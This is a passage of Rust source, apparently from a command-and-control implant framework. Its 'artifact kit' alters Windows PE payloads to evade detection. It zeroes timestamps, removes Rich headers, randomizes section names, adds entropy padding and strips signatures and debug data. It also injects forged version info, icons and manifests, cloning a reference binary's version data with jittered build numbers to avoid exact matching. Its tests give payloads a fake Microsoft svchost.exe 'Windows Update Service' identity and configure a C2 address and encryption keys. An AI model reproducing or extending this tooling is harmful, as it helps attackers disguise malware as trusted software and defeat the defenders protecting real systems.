    write_u32_le(buf, new_sec_hdr_off + 8, virt_size);              // VirtualSize
    write_u32_le(buf, new_sec_hdr_off + 12, new_va);                // VirtualAddress
    write_u32_le(buf, new_sec_hdr_off + 16, raw_size);              // SizeOfRawData
    write_u32_le(buf, new_sec_hdr_off + 20, raw_off);               // PointerToRawData
    write_u32_le(buf, new_sec_hdr_off + 24, 0);                     // PointerToRelocations
    write_u32_le(buf, new_sec_hdr_off + 28, 0);                     // PointerToLinenumbers
    write_u16_le(buf, new_sec_hdr_off + 32, 0);                     // NumberOfRelocations
    write_u16_le(buf, new_sec_hdr_off + 34, 0);                     // NumberOfLinenumbers
    write_u32_le(buf, new_sec_hdr_off + 36, 0x4000_0040u32);        // Characteristics: initialized data + read

    // Update NumberOfSections in COFF header.
    write_u16_le(buf, fh_off + 2, (n_sec + 1) as u16);

    // Update IMAGE_DIRECTORY_ENTRY_RESOURCE (index 2) in the optional header.
    let dd_base = oh_off + if is_plus { 112 } else { 96 };
    let rsrc_dd_off = dd_base + 2 * 8;
    write_u32_le(buf, rsrc_dd_off, new_va);
    write_u32_le(buf, rsrc_dd_off + 4, virt_size);

    // Update SizeOfImage.
    let new_size_of_image = new_va as usize + align_up(virt_size as usize, section_align);
    write_u32_le(buf, oh_off + 56, new_size_of_image as u32);

    // Append the raw data, padded to file_align.
    buf.resize(raw_off as usize, 0);
    buf.extend_from_slice(&rsrc_data);
    let new_len = align_up(buf.len(), file_align);
    buf.resize(new_len, 0);

    Ok(())
}

fn align_up(val: usize, align: usize) -> usize {
    if align == 0 { return val; }
    (val + align - 1) & !(align - 1)
}

// ── Public high-level injection functions ─────────────────────────────────────

/// Inject or replace the VS_VERSIONINFO resource (RT_VERSION = 16) in the PE.
pub fn inject_version_info(buf: &mut Vec<u8>, cfg: &VersionInfoConfig) -> Result<()> {
    // If clone_from is set, try to extract version info from the reference PE.
    // On the build host (likely Linux) the reference PE probably doesn't exist;
    // fall back to config-based generation silently.
    let vi_data = if let Some(ref ref_path) = cfg.clone_from {
        match std::fs::read(ref_path) {
            Ok(ref_bytes) => {
                match extract_version_info_blob(&ref_bytes) {
                    Ok(mut blob) => {
                        // Increment the build number in the VS_FIXEDFILEINFO by a
                        // random 1-99 to avoid exact matching.
                        jitter_version_build(&mut blob);
                        blob
                    }
                    Err(e) => {
                        warn!("Failed to extract version info from {ref_path}: {e:#}; using config-based version info");
                        build_vs_versioninfo(cfg)
                    }
                }
            }
            Err(e) => {
                warn!("Could not read reference PE {ref_path}: {e:#}; using config-based version info");
                build_vs_versioninfo(cfg)
            }
        }
    } else {
        build_vs_versioninfo(cfg)
    };

    let mut rsrc = ResourceSectionBuilder::default();
    // RT_VERSION = 16, name ID = 1, language ID = 0 (neutral).
    rsrc.add(16, 1, 0, vi_data);
    inject_rsrc_section(buf, &rsrc)
}

/// Inject RT_ICON (3) and RT_GROUP_ICON (14) resources from a .ico file.
pub fn inject_icon(buf: &mut Vec<u8>, ico_path: &str) -> Result<()> {
    let ico_bytes = std::fs::read(ico_path)
        .with_context(|| format!("Failed to read icon file: {ico_path}"))?;
    let images = parse_ico(&ico_bytes).context("Failed to parse ICO file")?;
    if images.is_empty() {
        return Err(anyhow!("ICO file contains no images"));
    }

    let mut rsrc = ResourceSectionBuilder::default();

    // Build RT_ICON entries (type 3) and the GRPICONDIR for RT_GROUP_ICON (14).
    // GRPICONDIR layout: WORD reserved, WORD type, WORD count, then GRPICONDIRENTRY[]
    // Each GRPICONDIRENTRY: BYTE width, height, colorCount, reserved,
    //                       WORD planes, bitCount, DWORD bytesInRes, WORD id
    let mut grp_dir: Vec<u8> = Vec::new();
    grp_dir.extend_from_slice(&0u16.to_le_bytes()); // reserved
    grp_dir.extend_from_slice(&1u16.to_le_bytes()); // type = 1 (icon)
    grp_dir.extend_from_slice(&(images.len() as u16).to_le_bytes()); // count

    for (i, img) in images.iter().enumerate() {
        let icon_id = (i as u32) + 1;
        // RT_ICON entry.
        rsrc.add(3, icon_id, 0, img.data.clone());
        // GRPICONDIRENTRY (14 bytes).
        grp_dir.push(img.width);
        grp_dir.push(img.height);
        grp_dir.push(img.color_count);
        grp_dir.push(0); // reserved
        grp_dir.extend_from_slice(&img.planes.to_le_bytes());
        grp_dir.extend_from_slice(&img.bit_count.to_le_bytes());
        grp_dir.extend_from_slice(&(img.data.len() as u32).to_le_bytes());
        grp_dir.extend_from_slice(&(icon_id as u16).to_le_bytes());
    }

    // RT_GROUP_ICON entry (type 14, name 1, lang 0).
    rsrc.add(14, 1, 0, grp_dir);
    inject_rsrc_section(buf, &rsrc)
}

/// Inject or replace the RT_MANIFEST resource (type 24) in the PE.
///
/// `manifest` can be `"asInvoker"`, `"requireAdministrator"`, `"highestAvailable"`,
/// or a literal XML string.
pub fn inject_manifest(buf: &mut Vec<u8>, manifest: &str) -> Result<()> {
    let xml = manifest_xml(manifest);
    let xml_bytes = xml.into_bytes(); // UTF-8

    let mut rsrc = ResourceSectionBuilder::default();
    // RT_MANIFEST = 24, name = 1 (executable), lang = 0.
    rsrc.add(24, 1, 0, xml_bytes);
    inject_rsrc_section(buf, &rsrc)
}

// ── Clone-from helpers ────────────────────────────────────────────────────────

/// Extract the raw VS_VERSIONINFO blob from a reference PE's resource section.
fn extract_version_info_blob(pe_bytes: &[u8]) -> Result<Vec<u8>> {
    let (_, _, oh_off, _, _, is_plus) = parse_pe_offsets(pe_bytes)?;
    let dd_base = oh_off + if is_plus { 112 } else { 96 };
    let rsrc_dd_off = dd_base + 2 * 8;
    if rsrc_dd_off + 8 > pe_bytes.len() {
        return Err(anyhow!("No resource directory in reference PE"));
    }
    let rsrc_rva = read_u32_le(pe_bytes, rsrc_dd_off);
    let rsrc_size = read_u32_le(pe_bytes, rsrc_dd_off + 4);
    if rsrc_rva == 0 || rsrc_size == 0 {
        return Err(anyhow!("Reference PE has no resource section"));
    }
    let rsrc_file_off = rva_to_file_offset(pe_bytes, rsrc_rva)
        .ok_or_else(|| anyhow!("Failed to resolve resource section RVA"))?;
    let rsrc = &pe_bytes[rsrc_file_off..];

    // Walk the resource directory tree looking for RT_VERSION (type 16).
    // L1: type entries. Each IMAGE_RESOURCE_DIRECTORY_ENTRY is 8 bytes.
    // Header is 16 bytes; NumberOfNamedEntries at +12, NumberOfIdEntries at +14.
    let n_named = read_u16_le(rsrc, 12) as usize;
    let n_id = read_u16_le(rsrc, 14) as usize;
    let n_total = n_named + n_id;
    for i in 0..n_total {
        let entry_off = 16 + i * 8;
        if entry_off + 8 > rsrc.len() { break; }
        let type_id = read_u32_le(rsrc, entry_off);
        if type_id != 16 { continue; } // RT_VERSION
        let sub_off = (read_u32_le(rsrc, entry_off + 4) & 0x7FFF_FFFF) as usize;
        // L2: name entries for this type.
        if sub_off + 16 > rsrc.len() { break; }
        let n2_named = read_u16_le(rsrc, sub_off + 12) as usize;
        let n2_id = read_u16_le(rsrc, sub_off + 14) as usize;
        let n2 = n2_named + n2_id;
        if n2 == 0 { break; }
        let l2_entry_off = sub_off + 16;
        if l2_entry_off + 8 > rsrc.len() { break; }
        let l3_dir_off = (read_u32_le(rsrc, l2_entry_off + 4) & 0x7FFF_FFFF) as usize;
        // L3: language entry.
        if l3_dir_off + 24 > rsrc.len() { break; }
        let data_entry_off = read_u32_le(rsrc, l3_dir_off + 20) as usize; // first lang entry offset
        if data_entry_off + 16 > rsrc.len() { break; }
        let data_rva = read_u32_le(rsrc, data_entry_off);
        let data_size = read_u32_le(rsrc, data_entry_off + 4) as usize;
        let data_file_off = rva_to_file_offset(pe_bytes, data_rva)
            .ok_or_else(|| anyhow!("Failed to resolve version info data RVA"))?;
        if data_file_off + data_size > pe_bytes.len() {
            return Err(anyhow!("Version info data out of bounds"));
        }
        return Ok(pe_bytes[data_file_off..data_file_off + data_size].to_vec());
    }
    Err(anyhow!("No RT_VERSION resource found in reference PE"))
}

/// Jitter the build number in a VS_FIXEDFILEINFO blob by a random 1-99.
fn jitter_version_build(blob: &mut Vec<u8>) {
    // VS_VERSION_INFO header is at the start.  VS_FIXEDFILEINFO starts after
    // the header (6 bytes) + key ("VS_VERSION_INFO" in UTF-16LE = 30 + 2 bytes null = 32 bytes,
    // padded to 4 = 32) = 38 bytes. Then aligned to 4 = 40.
    // Signature: 0xFEEF04BD at offset 0.
    // Scan the blob for 0xFEEF04BD to locate the fixed info.
    let sig = 0xFEEF04BDu32.to_le_bytes();
    let Some(sig_off) = blob.windows(4).position(|w| w == sig) else {
        return;
    };
    // dwFileVersionLS is at sig_off + 12.
    if sig_off + 16 > blob.len() { return; }
    let fv_ls = read_u32_le(blob, sig_off + 12);
    let build = ((fv_ls >> 16) & 0xFFFF) as u16;
    let rev   = (fv_ls & 0xFFFF) as u16;
    let mut rng = thread_rng();
    let delta: u16 = rng.gen_range(1..=99);
    let new_build = build.wrapping_add(delta);
    let new_fv_ls = ((new_build as u32) << 16) | (rev as u32);
    write_u32_le(blob, sig_off + 12, new_fv_ls);
    // Also patch dwProductVersionLS (at sig_off+20).
    if sig_off + 24 <= blob.len() {
        let pv_ls = read_u32_le(blob, sig_off + 20);
        let p_build = ((pv_ls >> 16) & 0xFFFF) as u16;
        let p_rev   = (pv_ls & 0xFFFF) as u16;
        let new_p_build = p_build.wrapping_add(delta);
        write_u32_le(blob, sig_off + 20, ((new_p_build as u32) << 16) | (p_rev as u32));
    }
}

// ── Top-level entry points ────────────────────────────────────────────────────

/// Apply all artifact kit operations to `buf` according to `cfg`.
///
/// This is the main entry point used by the build pipeline.  It returns a
/// modified copy; the original slice is not mutated.
///
/// On non-Windows targets (where the binary is ELF or Mach-O rather than PE)
/// the function returns `Ok(())` immediately after logging a message — all
/// operations are no-ops.
pub fn apply_all(buf: &mut Vec<u8>, cfg: &PayloadConfig) -> Result<()> {
    // Detect PE vs non-PE by checking the MZ magic.
    if buf.len() < 2 || &buf[0..2] != b"MZ" {
        info!("artifact kit: binary does not start with MZ — PE operations skipped (non-Windows target)");
        return Ok(());
    }

    info!("artifact kit: applying PE hardening operations");

    // 1. Timestamp zeroing.
    zero_timestamp(buf);
    info!("artifact kit: timestamp zeroed");

    // 2. Rich header removal.
    remove_rich_header(buf);
    info!("artifact kit: Rich header removed");

    // 3. Section name randomization.
    randomize_section_names(buf);
    info!("artifact kit: section names randomized");

    // 4. Entropy padding.
    add_entropy_padding(buf);
    info!("artifact kit: entropy padding added");

    // 5. Strip digital signature.
    if cfg.strip_signature {
        strip_signature(buf);
        info!("artifact kit: digital signature stripped");
    }

    // 6. Strip debug directory.
    if cfg.strip_debug {
        strip_debug_directory(buf);
        info!("artifact kit: debug directory stripped");
    }

    // 7. Inject version info.
    if let Some(ref vi) = cfg.version_info {
        inject_version_info(buf, vi).context("artifact kit: version info injection failed")?;
        info!("artifact kit: version info injected");
    }

    // 8. Inject icon.
    if let Some(ref icon) = cfg.icon_path {
        inject_icon(buf, icon).context("artifact kit: icon injection failed")?;
        info!("artifact kit: icon injected");
    }

    // 9. Inject manifest.
    let manifest = cfg.custom_manifest.as_deref()
        .or(cfg.manifest_preset.as_deref());
    if let Some(m) = manifest {
        inject_manifest(buf, m).context("artifact kit: manifest injection failed")?;
        info!("artifact kit: manifest injected");
    }

    // 10. Recalculate PE checksum.
    recalculate_checksum(buf);
    info!("artifact kit: PE checksum recalculated");

    Ok(())
}

/// Apply only the original four hardening operations (for the standalone CLI).
#[allow(dead_code)]
pub fn apply_hardening_only(buf: &mut Vec<u8>) {
    if buf.len() < 2 || &buf[0..2] != b"MZ" {
        info!("pe-hardener: binary does not start with MZ — operations skipped");
        return;
    }
    zero_timestamp(buf);
    remove_rich_header(buf);
    randomize_section_names(buf);
    add_entropy_padding(buf);
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal valid PE32 header stub for testing.  Does not contain real code.
    fn make_minimal_pe() -> Vec<u8> {
        let mut buf = vec![0u8; 0x400];
        // MZ magic
        buf[0] = b'M';
        buf[1] = b'Z';
        // e_lfanew at 0x3C = 0x80
        buf[0x3C] = 0x80;
        let pe_off = 0x80usize;
        // "PE\0\0"
        buf[pe_off] = b'P';
        buf[pe_off + 1] = b'E';
        // COFF header: Machine=x86(0x14c), NumberOfSections=1, SizeOfOptionalHeader=0xE0
        buf[pe_off + 4] = 0x4C;
        buf[pe_off + 5] = 0x01; // Machine = IMAGE_FILE_MACHINE_I386
        buf[pe_off + 6] = 1;    // NumberOfSections = 1
        buf[pe_off + 20] = 0xE0; // SizeOfOptionalHeader = 224 (PE32)
        // Optional header: Magic=0x10B (PE32)
        let oh = pe_off + 24;
        buf[oh] = 0x0B;
        buf[oh + 1] = 0x01; // PE32
        // SizeOfHeaders at oh+60
        write_u32_le(&mut buf, oh + 60, 0x200);
        // SizeOfImage at oh+56
        write_u32_le(&mut buf, oh + 56, 0x1000);
        // FileAlignment at oh+36
        write_u32_le(&mut buf, oh + 36, 0x200);
        // SectionAlignment at oh+32
        write_u32_le(&mut buf, oh + 32, 0x1000);
        // NumberOfRvaAndSizes at oh+92
        write_u32_le(&mut buf, oh + 92, 16);
        // Section header at pe_off+4+20+0xE0 = pe_off+228 = 0x80+228 = 0x164
        let sec = pe_off + 4 + 20 + 0xE0;
        // .text section
        buf[sec..sec + 5].copy_from_slice(b".text");
        write_u32_le(&mut buf, sec + 8, 0x100);   // VirtualSize
        write_u32_le(&mut buf, sec + 12, 0x1000); // VirtualAddress
        write_u32_le(&mut buf, sec + 16, 0x200);  // SizeOfRawData
        write_u32_le(&mut buf, sec + 20, 0x200);  // PointerToRawData
        buf
    }

    #[test]
    fn timestamp_zeroed() {
        let mut pe = make_minimal_pe();
        // Set a non-zero timestamp.
        let pe_off = 0x80usize;
        let fh_off = pe_off + 4;
        write_u32_le(&mut pe, fh_off + 4, 0xDEAD_BEEF);
        zero_timestamp(&mut pe);
        assert_eq!(read_u32_le(&pe, fh_off + 4), 0);
    }

    #[test]
    fn entropy_padding_increases_size() {
        let mut pe = make_minimal_pe();
        let before = pe.len();
        add_entropy_padding(&mut pe);
        assert!(pe.len() > before + 1023, "entropy padding should add ≥1024 bytes");
        assert!(pe.len() < before + 4097, "entropy padding should add <4096 bytes");
    }

    #[test]
    fn checksum_recalculation_does_not_panic() {
        let mut pe = make_minimal_pe();
        recalculate_checksum(&mut pe);
        // Just verify it doesn't panic and the checksum is non-zero for our stub.
        let oh = 0x80 + 24;
        let _cksum = read_u32_le(&pe, oh + 64);
    }

    #[test]
    fn version_info_blob_builds() {
        let cfg = VersionInfoConfig {
            file_version: Some("10.0.19041.1".to_string()),
            product_version: Some("10.0.19041.1".to_string()),
            company_name: Some("Microsoft Corporation".to_string()),
            file_description: Some("Windows Update Service".to_string()),
            product_name: Some("Microsoft Windows Operating System".to_string()),
            legal_copyright: Some("© Microsoft Corporation. All rights reserved.".to_string()),
            original_filename: Some("svchost.exe".to_string()),
            file_version_name: None,
            comments: None,
            clone_from: None,
        };
        let blob = build_vs_versioninfo(&cfg);
        assert!(blob.len() > 52, "VS_VERSIONINFO blob should be larger than the fixed-info alone");
        // Must start with wLength (non-zero) followed by wValueLength=52.
        let w_len = u16::from_le_bytes([blob[0], blob[1]]);
        let w_val_len = u16::from_le_bytes([blob[2], blob[3]]);
        assert_eq!(w_len as usize, blob.len());
        assert_eq!(w_val_len, 52);
    }

    #[test]
    fn apply_hardening_only_on_non_pe_is_noop() {
        let mut buf = b"ELF binary data".to_vec();
        let original = buf.clone();
        apply_hardening_only(&mut buf);
        // Non-MZ: no operations applied, so the buffer is unchanged.
        assert_eq!(buf, original);
    }

    #[test]
    fn apply_all_on_non_pe_is_noop() {
        let cfg = PayloadConfig {
            target_os: "linux".to_string(),
            target_arch: "x86_64".to_string(),
            c2_address: "127.0.0.1:8444".to_string(),
            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
            hmac_key: None,
            c_server_secret: None,
            server_cert_fingerprint: None,
            features: vec![],
            output_name: None,
            package: "agent".to_string(),
            bin_name: None,
            version_info: None,
            icon_path: None,
            manifest_preset: None,
            custom_manifest: None,
            strip_signature: false,
            strip_debug: false,
        };
        let mut buf = b"ELF binary data here".to_vec();
        let original = buf.clone();
        apply_all(&mut buf, &cfg).unwrap();
        assert_eq!(buf, original);
    }

    #[test]
    fn manifest_xml_presets_are_valid() {
        for preset in &["asInvoker", "requireAdministrator", "highestAvailable"] {
            let xml = manifest_xml(preset);
            assert!(xml.contains(preset), "preset {preset} should appear in output XML");
        }
    }
}
